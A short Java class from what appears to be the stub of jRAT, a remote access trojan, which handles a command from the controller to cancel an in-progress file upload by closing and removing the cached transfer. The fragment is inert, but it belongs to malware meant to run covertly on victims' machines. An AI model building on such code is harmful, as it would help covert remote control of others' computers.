package se.jrat.stub.packets.incoming;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.stub.Connection;

public class Packet105CancelClientUpload extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String remotePath = Connection.instance.readLine();

		TransferData localData = FileCache.get(remotePath);
		
		if (localData != null) {
			localData.getOutputStream().close();
			FileCache.remove(localData);
			localData.getRunnable().interrupt();
		}
	}

}
